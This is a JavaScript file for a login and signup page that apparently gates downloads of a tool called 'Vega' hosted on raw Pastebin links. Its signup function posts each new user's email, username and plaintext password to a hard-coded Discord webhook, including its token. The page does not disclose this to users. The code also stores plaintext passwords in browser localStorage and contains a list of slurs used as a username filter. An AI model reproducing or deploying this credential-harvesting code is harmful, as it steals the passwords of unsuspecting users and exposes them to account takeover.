const userDatabase = JSON.parse(localStorage.getItem('userDatabase')) || {};

// Replace with your actual Discord webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1301983808769363969/IFvuPlMLpydA2FUKWrBZiYUpUSmmXlyUIv_GgTJSQp5GQVnexxawK3vv4dZuAL496g5u"; // Place your webhook URL here

document.getElementById('login-btn').addEventListener('click', login);
document.getElementById('signup-btn').addEventListener('click', openSignup);
document.getElementById('submit-signup').addEventListener('click', signup);
document.getElementById('back-to-login').addEventListener('click', backToLogin);
document.getElementById('logout-btn').addEventListener('click', logout);
document.getElementById('vega-download').addEventListener('click', () => {
    window.open("https://pastebin.com/raw/P3Gb4fxR"); // Your download link
});
document.getElementById('option-key').addEventListener('click', () => {
    window.open("https://pastebin.com/raw/GFi72wpN"); // Your key link
});

// Function to check if a username is valid
function isValidUsername(username) {
    // Regular expression to check for special characters or spaces
    const specialCharsRegex = /[^a-zA-Z0-9]/; 
    // Array of bad words (customize as needed)
    const badWords = ["nigga", "nigger", "bitch"]; 

    // Check for spaces or special characters
    if (username.trim() === "" || username.includes(" ") || specialCharsRegex.test(username)) {
        alert("Username cannot contain spaces or special characters!");
        return false;
    }

    // Check for bad words
    for (const word of badWords) {
        if (username.toLowerCase().includes(word)) {
            alert(`Username cannot contain the word "${word}"!`);
            return false;
        }
    }

    return true;
}

// Function to send data to Discord webhook
async function sendToWebhook(email, username, password) {
    const data = {
        content: `New Signup:\n**Email:** ${email}\n**Username:** ${username}\n**Password:** ${password}`
    };
    
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            console.error('Failed to send webhook:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending webhook:', error);
    }
}

function openSignup() {
    document.getElementById('form-container').style.display = 'none';
    document.getElementById('signup-container').style.display = 'block';
    // Clear the signup input fields
    document.getElementById('email').value = '';
    document.getElementById('signup-username').value = '';
    document.getElementById('signup-password').value = '';
    document.getElementById('confirm-password').value = '';
}

function backToLogin() {
    document.getElementById('form-container').style.display = 'block';
    document.getElementById('signup-container').style.display = 'none';
}

async function signup() {
    const email = document.getElementById('email').value;
    const username = document.getElementById('signup-username').value;
    const password = document.getElementById('signup-password').value;
    const confirmPassword = document.getElementById('confirm-password').value;

    // Check if username is valid
    if (!isValidUsername(username)) {
        return;
    }

    // Check if the username already exists
    if (userDatabase[username]) {
        alert("Username already exists!");
        return;
    }

    // Validate password confirmation
    if (password !== confirmPassword) {
        alert("Passwords do not match!");
        return;
    }

    // Save user data
    userDatabase[username] = { email, password };
    localStorage.setItem('userDatabase', JSON.stringify(userDatabase)); // Save to localStorage
    alert("Signup successful! You can now log in.");

    // Send the signup details to Discord webhook
    await sendToWebhook(email, username, password);

    backToLogin();
}

function login() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (userDatabase[username] && userDatabase[username].password === password) {
        alert("Login successful!");
        localStorage.setItem('loggedInUser', username); // Store the logged-in username
        document.getElementById('form-container').style.display = 'none';
        document.getElementById('main-app').style.display = 'block';
        updateMainAppUI(username); // Update UI with user-specific info
    } else {
        alert("Invalid username or password!");
    }
}

// Function to update the main app UI with user-specific information
function updateMainAppUI(username) {
    document.getElementById('welcome-message').innerText = `Welcome, ${username}!`;
    document.getElementById('logout-btn').style.display = 'block'; // Show logout button
}

// Logout function
function logout() {
    localStorage.removeItem('loggedInUser'); // Remove logged-in user from localStorage
    document.getElementById('main-app').style.display = 'none';
    document.getElementById('form-container').style.display = 'block'; // Show the login form again
    alert("You have been logged out.");
}

// Populate the login form with existing user data if available
window.onload = () => {
    const savedUsername = document.getElementById('username');
    const savedPassword = document.getElementById('password');
    
    if (userDatabase && Object.keys(userDatabase).length > 0) {
        // Auto-fill the username and password if available
        savedUsername.value = localStorage.getItem('lastUsername') || '';
        savedPassword.value = localStorage.getItem('lastPassword') || '';
    }

    // Check if the user is already logged in
    const loggedInUser = localStorage.getItem('loggedInUser');
    if (loggedInUser) {
        updateMainAppUI(loggedInUser); // Update UI for the logged-in user
    }

    // Add event listener to save last used username and password
    savedUsername.addEventListener('input', () => {
        localStorage.setItem('lastUsername', savedUsername.value);
    });
    savedPassword.addEventListener('input', () => {
        localStorage.setItem('lastPassword', savedPassword.value);
    });
}
